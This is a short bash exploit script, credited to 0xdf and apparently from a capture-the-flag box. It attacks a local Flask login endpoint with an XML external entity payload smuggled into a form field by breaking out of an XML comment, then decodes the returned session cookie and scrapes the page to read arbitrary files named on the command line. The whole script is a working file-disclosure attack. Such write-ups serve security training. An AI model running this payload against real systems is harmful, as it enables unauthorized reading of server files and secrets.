#!/bin/bash
##
## c/o 0xdf
########################
########################
##
##

cookie=$(curl -s -v -X POST 'http://127.0.0.1:8888/login' --data-urlencode "username=&test;" --data-urlencode "version=1.0.0 -->
                                                                                   
<!DOCTYPE root [<!ENTITY test SYSTEM '"$1"'>]><!--" -x http://127.0.0.1:8080 2>&1 |
    grep Set-Cookie | 
    cut -d'=' -f2 |
    cut -d';' -f1)
>&2 echo "[+] Got cookie: $cookie"
>&2 flask_session_cookie_manager3.py decode -c $cookie | 
    cut -d"'" -f2 | 
    jq -r '.lxml." b"' | 
    base64 -d | 
    base64 -d

>&2 echo
curl -s -x http://127.0.0.1:8080 -b "session=$cookie" http://127.0.0.1:8888/site |
    pup '#welcome text{}' | 
    sed 's/Welcome, //g'
    
###########################
##
##
